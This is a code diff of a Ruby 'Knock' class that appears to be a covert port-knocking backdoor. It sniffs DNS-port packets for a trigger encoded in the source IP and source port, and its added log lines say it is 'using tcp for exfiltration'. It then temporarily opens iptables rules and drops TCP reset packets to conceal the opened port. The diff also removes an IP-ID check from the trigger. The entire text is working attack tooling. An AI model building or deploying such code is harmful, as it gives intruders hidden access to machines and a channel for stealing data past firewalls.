@@ -10,38 +10,39 @@ class Knock
   end
 
   def sniff
-    @cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => "udp and port 53")
+	puts "starting sniff"
+    @cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => "udp and dst port 53")
     @cap.stream.each do |p|
+		puts "packet recieved"
       pkt = Packet.parse p
-      if pkt.is_udp? && pkt.ip_header.ip_id == 32452
-        a = pkt.ip_saddr.split(".")
-        if a[2].to_i == 239 && pkt.udp_sport == 21423
-          puts "Success"
-          case a[1].to_i
-            when 1..80
-              @tos =  "icmp"
-            when 81..161
-              @tos = "tcp"
-            when 162..254
-              @tos = "udp"
-            else
-              abort "Knock::sniff invalid range"
-          end
-          puts "uh"
-          sport = a[0].to_i * a[3].to_i
-          if @tos == "icmp"
-            system("iptables -I INPUT -p " + @tos + " -j ACCEPT")
-            t = Thread.new {sleep(100); system("iptables -D INPUT -p " + @tos + " -j ACCEPT" ) }
+      a = pkt.ip_saddr.split(".")
+      if a[2].to_i == 239 && pkt.udp_sport == 21423
+        case a[1].to_i
+          when 1..80
+			puts "using icmp for exfiltration"
+            @tos = "icmp"
+          when 81..161
+			puts "using tcp for exfiltration"
+            @tos = "tcp"
+          when 162..254
+			puts "using udp for exfiltration"
+            @tos = "udp"
           else
-            system("iptables -I INPUT -p " + @tos + " --sport " + sport.to_s + " -j ACCEPT")
-            t = Thread.new {sleep(100); system("iptables -D INPUT -p " + @tos + " --sport " + sport.to_s + " -j ACCEPT") }
-          end
-          if @tos == "tcp"
+            abort "Knock::sniff invalid range"
+        end
+        sport = a[0].to_i * a[3].to_i
+        if @tos == "icmp"
+          system("iptables -I INPUT -p " + @tos + " -j ACCEPT")
+          t = Thread.new {sleep(100); system("iptables -D INPUT -p " + @tos + " -j ACCEPT" ) }
+        else
+          system("iptables -I INPUT -p " + @tos + " --sport " + sport.to_s + " -j ACCEPT")
+          t = Thread.new {sleep(100); system("iptables -D INPUT -p " + @tos + " --sport " + sport.to_s + " -j ACCEPT") }
+        end
+        if @tos == "tcp"
           system("iptables -I OUTPUT -p tcp --sport " + sport.to_s + " --tcp-flags RST RST -j DROP")
           t = Thread.new {sleep(100); system("iptables -D OUTPUT -p tcp --sport " + sport.to_s + " --tcp-flags RST RST -j DROP") }
-          end
-          return sport
         end
+        return sport
       end
     end
   end
